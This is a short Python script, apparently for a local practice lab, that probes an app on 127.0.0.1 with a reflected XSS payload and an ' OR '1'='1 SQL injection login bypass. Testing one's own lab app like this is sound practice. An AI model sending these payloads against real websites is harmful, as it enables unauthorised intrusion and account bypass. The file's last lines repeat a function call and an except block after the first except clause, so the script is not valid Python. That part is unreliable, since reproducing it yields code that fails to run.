import requests

TARGET_URL = "http://127.0.0.1:5001"

def check_xss():
    print("[*] Testing for Reflected XSS...")
    payload = "<script>alert('XSS')</script>"
    test_url = f"{TARGET_URL}/search?name={payload}"
    
    response = requests.get(test_url)
    
    if payload in response.text:
        print("[!] CRITICAL: XSS Vulnerability detected in /search?name=")
    else:
        print("[-] No XSS detected.")

def check_sql_injection():
    print("\n[*] Testing for SQL Injection...")
    payload = "' OR '1'='1"
    data = {'username': payload, 'password': 'any'}
    
    response = requests.post(f"{TARGET_URL}/login", data=data)
    
    if "Welcome back" in response.text or "FLAG" in response.text:
        print("[!] CRITICAL: SQL Injection detected in /login (username field)")
    else:
        print("[-] No SQL Injection detected.")

if __name__ == "__main__":
    print("--- Simple Vulnerability Scanner ---")
    try:
        requests.get(TARGET_URL)
        check_xss()
        check_sql_injection()
    except requests.exceptions.ConnectionError:
        print("[!] Error: Target website is not running! Run app.py first.")

        check_sql_injection()
    except requests.exceptions.ConnectionError:
        print("[!] Error: Target website is not running! Run app.py first.")

